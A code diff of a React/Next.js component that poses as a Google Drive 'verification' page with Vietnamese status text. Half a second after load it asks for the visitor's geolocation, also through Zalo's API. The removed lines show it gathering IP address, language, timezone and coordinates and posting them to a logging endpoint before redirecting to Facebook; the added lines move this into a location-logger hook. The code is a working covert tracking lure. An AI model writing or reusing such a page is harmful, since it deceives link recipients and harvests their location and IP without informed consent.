@@ -1,4 +1,3 @@
-
 'use client';
 
 import { useEffect, useState, useCallback } from 'react';
@@ -6,6 +5,7 @@ import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
 import { FileText, Loader2 } from 'lucide-react';
 import type { VerificationConfig } from '@/app/actions/settings';
+import { useLocationLogger } from '@/hooks/use-location-logger';
 
 interface DriveVerificationClientProps {
   config: VerificationConfig;
@@ -27,88 +27,30 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
   
   const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
 
+  const { log } = useLocationLogger('/api/log-location', { from: 'link' });
+
   const requestLocation = useCallback(() => {
     setStatus('requesting');
     setStatusText('Đang xác minh, vui lòng chờ...');
     
-    const processRequest = async () => {
-        let clientIp = 'N/A';
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            if (ipResponse.ok) {
-                const ipData = await ipResponse.json();
-                clientIp = ipData.ip;
-            }
-        } catch(e) {
-            console.error("Could not fetch IP", e);
-        }
-
-        const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
+    log({
+        onSuccess: () => {
             setStatus('success');
             setStatusText('Xác minh thành công, đang chuyển hướng...');
-            
-            const body: any = { 
-                ip: clientIp, 
-                from: 'link',
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-            };
-            
-            if (pos) {
-                body.lat = pos.coords.latitude;
-                body.lon = pos.coords.longitude;
-                body.acc = pos.coords.accuracy;
-            }
-
-            fetch('/api/log-location', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body),
-                keepalive: true,
-            }).finally(() => {
+            window.location.href = REDIRECT_URL;
+        },
+        onError: (error) => {
+            if (error?.code === 1) { // PERMISSION_DENIED
+                setStatus('denied');
+            } else {
+                // For other errors (timeout, not supported, etc.), just redirect.
+                setStatus('success');
+                setStatusText('Đang chuyển hướng...');
                 window.location.href = REDIRECT_URL;
-            });
-        };
-
-        const handleError = (error?: { code: number; message?: string }) => {
-          if (error?.code === 1) { // PERMISSION_DENIED
-              setStatus('denied');
-          } else {
-              // For other errors (like timeout), just log without location and redirect.
-              logDataAndRedirect();
-          }
-        };
-
-        // Check for Zalo's specific JS API first to fix ReferenceError and optimize
-        if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
-            (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
-                if (data.status === "SUCCESS" && data.latitude && data.longitude) {
-                    logDataAndRedirect({
-                        coords: {
-                            latitude: data.latitude,
-                            longitude: data.longitude,
-                            accuracy: data.accuracy || 15, // Zalo might not return accuracy
-                        },
-                    });
-                } else {
-                    // If Zalo API fails, treat as permission denied
-                    handleError({ code: 1, message: 'Zalo API failed or was denied' });
-                }
-            });
-        } else if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(
-            logDataAndRedirect,
-            (err) => handleError(err),
-            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-          );
-        } else {
-          // Fallback for browsers with no geo support
-          logDataAndRedirect();
+            }
         }
-    };
-    
-    processRequest();
-  }, [REDIRECT_URL]);
+    });
+  }, [log, REDIRECT_URL]);
 
   useEffect(() => {
     const timer = setTimeout(requestLocation, 500);
@@ -184,5 +126,3 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
     </div>
   );
 }
-
-    
